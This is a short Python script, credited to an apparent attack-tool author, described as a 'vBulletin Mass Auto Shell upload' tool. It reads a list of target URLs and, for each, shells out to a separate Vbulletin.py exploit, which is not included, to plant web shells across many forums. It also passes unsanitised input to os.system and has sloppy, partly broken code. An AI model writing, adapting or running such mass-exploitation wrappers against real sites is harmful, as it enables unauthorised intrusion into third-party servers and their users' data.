#/
#   Codder : HeraklesEagle
#   youtube: HeraklesEagle Azerbaijan
#   telegram:Herakles001
#\

#!/usr/bin/env python3 

import sys,os,argparse
import os.path
parser = argparse.ArgumentParser(description="vBulletin Mass Auto Shell upload  By : HeraklesEagle")
parser.add_argument('-l', '--liste', help='Target URL List')

args = parser.parse_args()


def Helprr():
    parser.print_help()
    exit(1)



def Clear():
    if os.name == "nt":
	os.system("cls")
    else:
	os.system("clear")



def Sikis(dosya):
    if os.path.isfile(dosya):
       file1 = open(dosya, "r")
       for line in file1:
	       os.system("python Vbulletin.py -l " + line.strip())
       file1.close




def main():
    if os.path.isfile("Vbulletin.py"):
        try:
            dosya = args.liste
            Sikis(dosya)

        except Exception as e:
            Clear()
            Helprr()
            print(e)
    else:
      print("Vbulletin.py Bulunamadi , indiridn lutfen !")
      
      
if __name__ == '__main__':
    exit(main())

